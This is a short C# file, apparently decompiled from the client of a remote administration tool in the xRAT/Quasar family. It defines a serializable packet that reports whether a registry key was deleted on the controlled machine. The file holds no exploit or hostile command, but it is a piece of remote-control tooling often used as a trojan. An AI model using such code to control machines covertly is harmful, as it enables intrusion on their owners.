using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetDeleteRegistryKeyResponse : GInterface4
{
	public string ParentPath { get; set; }

	public string KeyName { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
